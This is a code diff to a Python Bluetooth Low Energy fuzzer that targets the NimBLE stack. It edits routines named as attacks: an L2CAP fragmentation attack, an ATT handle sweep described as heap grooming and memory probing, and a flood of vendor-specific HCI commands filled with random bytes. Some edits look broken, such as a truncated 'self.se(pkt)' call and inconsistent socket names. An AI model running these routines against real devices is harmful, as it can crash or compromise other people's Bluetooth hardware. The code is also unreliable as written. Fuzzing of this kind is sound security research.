@@ -31,7 +31,7 @@ class NimBLEFuzzer(NimBLEConnectionManager):
                 HCI_Command_Hdr(opcode=0xFD01)/  # Vendor-specific
                 os.urandom(128)
             )
-            self._atomic_send(pkt)
+            self.se(pkt)
             time.sleep(0.001)
         
     def fuzz_link_layer(self, conn):
@@ -65,7 +65,7 @@ class NimBLEFuzzer(NimBLEConnectionManager):
         self.att_send_raw(conn, fuzzed_att)
 
 
-    def l2cap_fragmentation_attack(self):
+    def l2cap_fragmentation_attack(self, conn):
         """Protocol-aware L2CAP state corruption"""
         # Fragmented packet paradox
         frags = [
@@ -77,19 +77,19 @@ class NimBLEFuzzer(NimBLEConnectionManager):
         
         for pb_flag, payload in frags:
             acl = HCI_Hdr(type=2)/HCI_ACL_Hdr(
-                handle=self.conn_params['handle'],
+                handle=conn['handle'], 
                 PB=pb_flag
             )/payload
-            self.sock.send(acl)
+            self.socket.send(acl) 
             time.sleep(0.005)
 
-    def att_handle_reaper(self):
+    def att_handle_reaper(self, conn):
         """Advanced ATT handle fuzzing with memory probing"""
         # Heap grooming pattern
         for handle in range(0x0000, 0xFFFF, 0x100):
             pkt = ATT_Read_Request(gatt_handle=handle)
             self.sock.send(
-                HCI_Hdr(type=2)/HCI_ACL_Hdr(handle=self.conn_params['handle'])/
+                HCI_Hdr(type=2)/HCI_ACL_Hdr(handle=conn['handle'])/
                 L2CAP_Hdr(cid=4)/pkt
             )
             time.sleep(0.001)
@@ -130,19 +130,22 @@ def main():
         # Initialize and connect
         conn = fuzzer.init_connection(peer_address, "public")
         fuzzer.connect(conn)
-        
-        # Run fuzzing procedures
-        fuzzer.fuzz_link_layer(conn)
-        time.sleep(0.5)
-        fuzzer.fuzz_l2cap(conn)
-        time.sleep(0.5)
-        fuzzer.fuzz_att(conn)
-        time.sleep(0.5)
-        fuzzer.l2cap_fragmentation_attack(conn)
-        time.sleep(0.5)
-        fuzzer.att_handle_reaper(conn)
-        time.sleep(0.5)
-        fuzzer.timing_attack(conn)
+
+        try: 
+            # Run fuzzing procedures
+            fuzzer.fuzz_link_layer(conn)
+            time.sleep(0.5)
+            fuzzer.fuzz_l2cap(conn)
+            time.sleep(0.5)
+            fuzzer.fuzz_att(conn)
+            time.sleep(0.5)
+            fuzzer.l2cap_fragmentation_attack(conn)
+            time.sleep(0.5)
+            fuzzer.att_handle_reaper(conn)
+            time.sleep(0.5)
+            fuzzer.timing_attack(conn)
+        finally:
+            fuzzer.disconnect(conn)
 
 if __name__ == "__main__":
     main()
